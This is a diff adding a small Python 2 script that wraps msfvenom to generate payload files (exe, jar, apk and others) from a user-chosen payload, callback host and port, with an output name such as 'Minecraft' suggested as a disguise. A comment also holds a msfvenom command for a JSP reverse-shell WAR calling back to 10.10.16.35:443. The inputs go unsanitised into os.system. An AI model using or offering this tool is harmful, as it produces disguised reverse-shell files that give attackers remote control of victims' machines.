@@ -1,0 +1,42 @@
+#! /bin/python
+import os
+W = '\033[37m'
+R = '\033[1;31m'  # red
+G = '\033[1;32m'  # green
+O = '\033[0;33m'  # orange
+B = '\033[1;34m'  # blue
+P = '\033[1;35m'  # purple
+C = '\033[1;36m'  # cyan
+GRs = '\033[1;37m'  # gray
+#msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.35 LPORT=443 -f war -o reverse.war
+def banner():
+	print(O+""" 
+ _______  _______  _______  _______          _________ _______
+(       )(  ____ \(  ____ \(  ___  )|\     /|\__   __/(  ___  )
+| () () || (    \/| (    \/| (   ) || )   ( |   ) (   | (   ) |"""+G+"""
+| || || || (_____ | (__    | (___) || |   | |   | |   | |   | |
+| |(_)| |(_____  )|  __)   |  ___  || |   | |   | |   | |   | |
+| |   | |      ) || (      | (   ) || |   | |   | |   | |   | |"""+R+"""
+| )   ( |/\____) || )      | )   ( || (___) |   | |   | (___) |
+|/     \|\_______)|/       |/     \|(_______)   )_(   (_______)
+                                                               """+G+"""By Mrx04Programmer
+""")
+os.system("clear")
+banner()
+payload = raw_input(C+"Payload: "+W)
+host = raw_input(C+"LHOST: "+W)
+port = raw_input(C+"LPORT: "+W)
+ex = raw_input(B+"Extension (ej: exe,jar,apk, etc): "+W)
+output = raw_input(G+"OUTPUT(ex: Minecraft):"+W)
+os.system("clear")
+banner()
+if ex == "apk":
+	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
+elif "apk" in ex:
+	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
+else:
+	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
+if command == 32512:
+	print(R+"[-] Error.")
+if command == 0:
+	print(G+"[INFO]"+W+" File Created: "+P+output+"."+ex)
